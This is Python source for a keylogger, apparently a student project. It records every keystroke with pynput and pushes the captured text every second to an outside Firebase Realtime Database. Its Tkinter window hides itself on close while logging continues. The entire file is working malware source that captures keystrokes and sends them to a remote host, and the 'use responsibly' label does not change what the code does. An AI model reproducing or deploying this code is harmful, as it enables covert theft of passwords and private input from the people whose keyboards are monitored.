import os
import threading
import time
from pynput import keyboard
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import firebase_admin
from firebase_admin import credentials, db

# ✅ Load Firebase credentials (Replace with correct path)
cred = credentials.Certificate("D:\\AdvanceKeylogger\\firekey.json")  # ⚠️ Ensure this is correct
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://keylog-54efe-default-rtdb.firebaseio.com/'
})

# ✅ Reference to Firebase DB node
db_ref = db.reference("/keystrokes")

# ✅ Key buffer + lock
buffer = []
lock = threading.Lock()

# ✅ Capture all key presses, including special keys
def on_press(key):
    try:
        k = key.char  # For normal characters
    except AttributeError:
        try:
            k = f"[{key.name}]"  # For special keys like shift, ctrl, etc.
        except:
            k = f"[{str(key)}]"  # Fallback
    except:
        k = f"[{str(key)}]"  # Fallback

    with lock:
        buffer.append(k)

# ✅ Send key buffer to Firebase every 1 second
def send_buffer():
    while True:
        time.sleep(1)
        with lock:
            if buffer:
                data = ''.join(buffer)
                try:
                    db_ref.push(data)
                    print("Sent to Firebase:", data)
                except Exception as e:
                    print("Error sending to Firebase:", e)
                buffer.clear()

# ✅ Stop keylogger
def stop_listener():
    global listener
    listener.stop()
    messagebox.showinfo("Info", "Key logging stopped.")
    os._exit(0)

# ✅ GUI control
def hide_window():
    root.withdraw()

def show_window():
    root.deiconify()

# ✅ Keyboard listener
def start_listener():
    global listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

# ✅ GUI main function
def main():
    global root
    root = tk.Tk()
    root.title("Key Logger by Shaurya Parashar")
    root.geometry("500x400")

    # Background image (optional)
    try:
        bg_image = Image.open("img.jpg")  # ⚠️ Replace with valid path or comment this block
        bg_image = bg_image.resize((500, 400), Image.Resampling.LANCZOS)
        bg_photo = ImageTk.PhotoImage(bg_image)
        bg_label = tk.Label(root, image=bg_photo)
        bg_label.image = bg_photo  # Prevent garbage collection
        bg_label.place(relwidth=1, relheight=1)
    except FileNotFoundError:
        print("⚠️ Image not found. Skipping background image.")

    # UI Labels & Button
    tk.Label(root, text="Key Logger", font=("Helvetica", 28, "bold"), bg="#000", fg="#E94560").pack(pady=20)
    tk.Label(root, text="Developed by: Shaurya Parashar", font=("Helvetica", 16, "italic"), bg="#000", fg="#F5F5F5").pack(pady=5)
    tk.Label(root, text="B.Tech CSE, 5th Sem, Graphic Era University", font=("Helvetica", 10), bg="#000", fg="#A1D6E2").pack(pady=5)
    tk.Label(root, text="Logging keystrokes...", font=("Helvetica", 16), bg="#000", fg="#A1D6E2").pack(pady=10)

    tk.Button(
        root, text="Stop Logging", command=stop_listener,
        font=("Helvetica", 16), bg="#FF6F61", fg="#FFFFFF",
        activebackground="#D64550", width=20
    ).pack(pady=20)

    tk.Label(root, text="Use responsibly. Unauthorized use is prohibited.", font=("Helvetica", 12), bg="#000", fg="#CCCCCC").pack(side="bottom", pady=10)

    root.protocol("WM_DELETE_WINDOW", hide_window)
    root.mainloop()

# ✅ Run everything
if __name__ == "__main__":
    threading.Thread(target=start_listener, daemon=True).start()
    threading.Thread(target=send_buffer, daemon=True).start()
    main()
